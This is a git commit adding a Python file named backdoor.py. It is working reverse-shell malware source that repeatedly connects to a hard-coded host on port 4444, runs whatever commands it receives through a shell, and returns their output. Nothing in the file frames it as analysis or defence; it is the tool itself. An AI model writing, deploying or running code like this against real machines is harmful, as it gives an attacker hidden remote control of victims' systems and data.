857c2ab011304e4ecd2ba1b3ef9297ac4a3bab08
Amanelli <139354943+Amanelli@users.noreply.github.com>
2023-07-15 12:59:33 +0300

    Add files via upload

---
+++ backdoor.py
@@ -0,0 +1,49 @@
+import socket
+import time
+import subprocess
+import json
+import os
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def connection():
+    while True:
+        time.sleep(20)
+        try:
+            s.connect(('192.168.1.10', 4444))
+            shell()
+            s.close()
+            break
+        except:
+            connection()
+
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == 'quit':
+            break
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd':
+            os.chdir(command[3:])
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection()
+
+
+
